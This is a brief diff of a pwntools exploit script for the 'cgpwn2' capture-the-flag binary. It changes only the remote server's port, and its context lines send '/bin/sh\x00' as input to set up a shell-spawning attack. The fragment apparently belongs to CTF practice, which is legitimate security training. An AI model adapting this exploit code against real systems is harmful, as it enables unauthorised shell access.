@@ -1,7 +1,7 @@
 from pwn import *
 
 # p = process("./cgpwn2")
-p = remote("111.198.29.45" , 30310)
+p = remote("111.198.29.45" , 30882)
 elf = ELF("./cgpwn2")
 
 p.sendlineafter("name\n" , "/bin/sh\x00")
